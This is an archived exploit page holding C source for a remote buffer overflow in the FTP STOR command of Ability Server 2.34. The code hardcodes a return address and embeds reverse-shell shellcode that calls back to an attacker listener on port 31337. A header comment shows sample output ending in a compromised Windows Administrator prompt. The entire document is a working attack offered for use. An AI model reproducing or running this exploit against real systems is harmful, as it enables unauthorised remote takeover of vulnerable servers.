<html><head><title>Ability Server 2.34 FTP STOR Buffer Overflow Exploit (Unix Exploit)</title></head><pre>/*
no@0x00:~/Exploits/abilityftp$ ./ability-exploit
**Ability Server 2.34 Remote buffer overflow exploit in ftp STOR by NoPh0BiA.**
[x] Launching listener.
[x] Bind successfull.
[x] Listening on port 31337.
[x] Connected to: 192.168.0.1.
[x] Sending bad code...done.
[x] Waiting for shell.
[x] Got connection from 192.168.0.1.
[x] 0wn3d!

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop\abilitywebserver&gt;

 reverse shellcode that connects back to 192.168.0.2 lamers get your own shellcode ;)
 bad chars 0x00 0x0a 0x0d.
*/
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;errno.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;string.h&gt;

#define RET &quot;\xC7\xF2\xC8\x77&quot; /*win2k adv server sp4*/
#define PORT 21
#define PORT1 31337
#define BACKLOG 1

/* www.metasploit.com*/
char shellcode[] =
&quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5a\x81\x73\x17\x92\x8e&quot;
&quot;\xe9\x41\x83\xeb\xfc\xe2\xf4\x6e\x66\xbf\x41\x92\x8e\xba\x14\xc4&quot;
&quot;\xd9\x62\x2d\xb6\x96\x62\x04\xae\x05\xbd\x44\xea\x8f\x03\xca\xd8&quot;
&quot;\x96\x62\x1b\xb2\x8f\x02\xa2\xa0\xc7\x62\x75\x19\x8f\x07\x70\x6d&quot;
&quot;\x72\xd8\x81\x3e\xb6\x09\x35\x95\x4f\x26\x4c\x93\x49\x02\xb3\xa9&quot;
&quot;\xf2\xcd\x55\xe7\x6f\x62\x1b\xb6\x8f\x02\x27\x19\x82\xa2\xca\xc8&quot;
&quot;\x92\xe8\xaa\x19\x8a\x62\x40\x7a\x65\xeb\x70\x52\xd1\xb7\x1c\xc9&quot;
&quot;\x4c\xe1\x41\xcc\xe4\xd9\x18\xf6\x05\xf0\xca\xc9\x82\x62\x1a\x8e&quot;
&quot;\x05\xf2\xca\xc9\x86\xba\x29\x1c\xc0\xe7\xad\x6d\x58\x60\x86\x13&quot;
&quot;\x62\xe9\x40\x92\x8e\xbe\x17\xc1\x07\x0c\xa9\x8d\x8e\xe9\x41\x02&quot;
&quot;\x8f\xe9\x41\x24\x97\xf1\xa6\x36\x97\x99\xa8\x7e\x77\x43\x21\x4b&quot;
&quot;\x87\x1c\xec\x59\x63\x15\x7a\xc5\xdd\xdb\x1e\xa1\xbc\xe9\x1a\x1f&quot;
&quot;\xc5\xf1\x10\x6d\x59\x60\x9e\x1b\x4d\x64\x34\x86\xe4\xec\x18\xc3&quot;
&quot;\xdd\x16\x75\x1d\x71\xbc\x45\xcb\x07\xed\xcf\x70\x7c\xc2\x66\xc6&quot;
&quot;\x71\xde\xbe\xc7\xa6\xd8\x81\xc2\xde\xb9\x11\xd2\xde\xa9\x11\x6d&quot;
&quot;\xdb\xcd\xc8\x55\xe6\x29\xe9\x92\x8c\x81\x43\x92\xf4\x80\xc8\x73&quot;
&quot;\xe4\xf9\x10\xc5\x71\xbc\x61\xcb\xd7\x81\x02\xdf\xca\xe9\xc8\x71&quot;
&quot;\x09\x13\x70\x52\x03\x95\x65\x3e\xe4\xfc\x18\x61\x25\x6e\xbb\x11&quot;
&quot;\x62\xbd\x87\xd6\xaa\xf9\x05\xf4\x49\xad\x65\xae\x8f\xe8\xc8\xee&quot;
&quot;\xaa\xa1\xc8\xee\xaa\xa5\xc8\xee\xaa\xb9\xcc\xd6\xaa\xf9\x15\xc2&quot;
&quot;\xdf\xb8\x10\xd3\xdf\xa0\x10\xc3\xdd\xb8\xbe\xe7\x8e\x81\x33\x6c&quot;
&quot;\x3d\xff\xbe\xc7\x8a\x16\x91\x1b\x68\x16\x34\x92\xe6\x44\x98\x97&quot;
&quot;\x40\x16\x14\x96\x07\x2a\x2b\x6d\x71\xdf\xbe\x41\x71\x9c\x41\xfa&quot;
&quot;\x7e\x63\x45\xcd\x71\xbc\x45\xa3\x55\xba\xbe\x42\x8e\xe9\x41&quot;;

struct sockaddr_in hrm,lar,target;
void shell(int sock)
{
 fd_set fd_read;
 char buff[1024];
 int n;
 
 while(1) {
  FD_SET(sock,&amp;fd_read);
  FD_SET(0,&amp;fd_read);
 
  if(select(sock+1,&amp;fd_read,NULL,NULL,NULL)&lt;0) break;
 
  if( FD_ISSET(sock, &amp;fd_read) ) {
   n=read(sock,buff,sizeof(buff));
   if (n == 0) {
       printf (&quot;Connection closed.\n&quot;);
       exit(EXIT_FAILURE);
   } else if (n &lt; 0) {
       perror(&quot;read remote&quot;);
       exit(EXIT_FAILURE);
   }
   write(1,buff,n);
  }
 
  if ( FD_ISSET(0, &amp;fd_read) ) {
    if((n=read(0,buff,sizeof(buff)))&lt;=0){
      perror (&quot;read user&quot;);
      exit(EXIT_FAILURE);
    }
    write(sock,buff,n);
  }
 }
 close(sock);
}

int conn(char *ip)
{
 int sockfd;
 hrm.sin_family = AF_INET;
 hrm.sin_port = htons(PORT);
 hrm.sin_addr.s_addr = inet_addr(ip);
 bzero(&amp;(hrm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&amp;hrm,sizeof(struct sockaddr))) &lt; 0)
{
 perror(&quot;connect&quot;);
 exit(0);
}
 printf(&quot;[x] Connected to: %s.\n&quot;,ip);
 return sockfd;
}

int listener()
{
 int sd;
 lar.sin_family = AF_INET;
 lar.sin_port = htons(PORT1);
 lar.sin_addr.s_addr = INADDR_ANY;
 bzero(&amp;(lar.sin_zero),8);
 sd = socket(AF_INET,SOCK_STREAM,0);
if((bind(sd,(struct sockaddr *)&amp;lar,sizeof(struct sockaddr)))&lt;0)
{
 perror(&quot;bind&quot;);
 exit(0);
}
 printf(&quot;[x] Bind successfull.\n&quot;);
if((listen(sd,BACKLOG)) &lt; 0)
{
 perror(&quot;listen&quot;);
 exit(0);
}
 printf(&quot;[x] Listening on port %d.\n&quot;,PORT1);
 return sd;
}
int main(int argc, char *argv[])
{
 char *buffer=malloc(1387),*A=malloc(968),*B=malloc(32),*reply=malloc(200);
 int x,l,news,f;
 memset(A,0x41,968);
 strcat(buffer,A);
 memset(B,0x42,32);
 strcat(buffer,RET);
 strcat(buffer,B);
 strcat(buffer,shellcode);
 printf(&quot;**Ability Server 2.34 Remote buffer overflow exploit in ftp STOR by NoPh0BiA.**\n&quot;);
 printf(&quot;[x] Launching listener.\n&quot;);
 l = listener();
 x = conn(&quot;192.168.0.1&quot;);
 sleep(5);
 printf(&quot;[x] Sending bad code...&quot;);
 write(x,&quot;USER lar\r\nPASS lar\r\n&quot;,20);
 sleep(3);
 write(x,&quot;STOR &quot;,5);
 write(x,buffer,strlen(buffer));
 write(x,&quot;\r\n\r\n&quot;,4);
 sleep(3);
 printf(&quot;done.\n&quot;);
 printf(&quot;[x] Waiting for shell.\n&quot;);
 close(x);
while(1)
{
 news = sizeof(struct sockaddr_in);
if((f=accept(l,(struct sockaddr *)&amp;target,&amp;news)) &lt; 0)
 {
  perror(&quot;accept&quot;);
  continue;
 }
printf(&quot;[x] Got connection from %s.\n&quot;,inet_ntoa(target.sin_addr));
 if(!fork()){
 printf(&quot;[x] 0wn3d!\n\n&quot;);
 shell(f);
 close(f);
 exit(0);
}
 close(f);
}
 
}

// milw0rm.com [2004-11-07]</pre></html>